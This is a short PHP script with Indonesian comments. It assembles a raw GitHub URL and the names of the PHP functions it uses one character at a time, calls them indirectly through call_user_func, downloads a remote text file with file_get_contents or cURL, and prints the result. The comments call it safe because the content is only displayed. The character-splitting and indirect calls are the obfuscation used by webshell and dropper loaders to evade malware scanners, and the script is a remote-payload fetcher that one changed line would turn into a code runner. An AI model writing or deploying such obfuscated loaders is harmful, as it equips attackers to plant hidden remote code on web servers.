<?php
// ------------------- gaya terpecah-pecah, tapi aman -------------------
$_p1 = 'h'.'t'.'t'.'p'.'s'.':'.'/' . '/';
$_p2 = 'r'.'a'.'w'.'.'.'g'.'i'.'t'.'h'.'u'.'b'.'u'.'s'.'e'.'r'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'.'.'c'.'o'.'m';
$_p3 = '/k'.'o'.'l'.'a'.'n'.'g'.'k'.'a'.'l'.'i'.'n'.'g'.'0'.'8';
$_p4 = '/s'.'u'.'p'.'e'.'r'.'/r'.'e'.'f'.'s'.'/h'.'e'.'a'.'d'.'s'.'/m'.'a'.'i'.'n';
$_p5 = '/p'.'o'.'w'.'e'.'r'.'e'.'d'.'/s'.'u'.'p'.'p'.'l'.'y'.'/d'.'a'.'m'.'n'.'/a'.'i'.'.t'.'x'.'t';

$targetUrl = $_p1.$_p2.$_p3.$_p4.$_p5;

// fungsi "cek" dengan call_user_func
$_ini = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
$_funce = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';
$allow = call_user_func($_ini, 'a'.'l'.'l'.'o'.'w'.'_' . 'u'.'r'.'l'.'_' . 'f'.'o'.'p'.'e'.'n');
$has_curl = call_user_func($_funce, 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t');

$_result = false;

// pakai file_get_contents jika diizinkan
if ($allow) {
    $_fget = 'f'.'i'.'l'.'e'.'_' . 'g'.'e'.'t'.'_' . 'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
    $_ctx = stream_context_create(['http' => ['timeout' => 8]]);
    $_result = @call_user_func($_fget, $targetUrl, false, $_ctx);
}
// fallback ke cURL
elseif ($has_curl) {
    $_ci = call_user_func('c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t', $targetUrl);
    call_user_func('c'.'u'.'r'.'l'.'_' . 's'.'e'.'t'.'o'.'p'.'t', $_ci, constant('C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'R'.'E'.'T'.'U'.'R'.'N'.'T'.'R'.'A'.'N'.'S'.'F'.'E'.'R'), true);
    call_user_func('c'.'u'.'r'.'l'.'_' . 's'.'e'.'t'.'o'.'p'.'t', $_ci, constant('C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'F'.'O'.'L'.'L'.'O'.'W'.'L'.'O'.'C'.'A'.'T'.'I'.'O'.'N'), true);
    call_user_func('c'.'u'.'r'.'l'.'_' . 's'.'e'.'t'.'o'.'p'.'t', $_ci, constant('C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'T'.'I'.'M'.'E'.'O'.'U'.'T'), 8);
    $_result = call_user_func('c'.'u'.'r'.'l'.'_' . 'e'.'x'.'e'.'c', $_ci);
    call_user_func('c'.'u'.'r'.'l'.'_' . 'c'.'l'.'o'.'s'.'e', $_ci);
}

// Tindakan AMAN: tampilkan atau ulangi pesan gagal
if ($_result !== false && $_result !== null) {
    // tampilkan sebagai teks supaya jelas tidak dieksekusi
    header('Content-Type: text/plain; charset=utf-8');
    echo $_result;
} else {
    echo 'G'.'a'.'g'.'a'.'l'.' ' . 'm'.'e'.'n'.'g'.'u'.'n'.'d'.'u'.'h';
}
